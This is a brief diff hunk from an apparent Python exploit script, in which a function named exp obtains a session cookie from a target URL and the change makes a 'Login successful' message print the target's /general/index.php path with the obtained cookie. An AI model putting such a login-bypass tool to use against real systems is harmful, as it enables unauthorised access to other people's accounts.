@@ -65,7 +65,7 @@ def exp(u):
 
     cookie = get_cookie(u)
     if cookie != "123":
-        printFlag = "[Login successful]：" + u + "\n"
+        printFlag = "[Login successful]：" + u + "/general/index.php\t" + cookie + "\n"
     header["Cookie"] = cookie
 
     # password:a
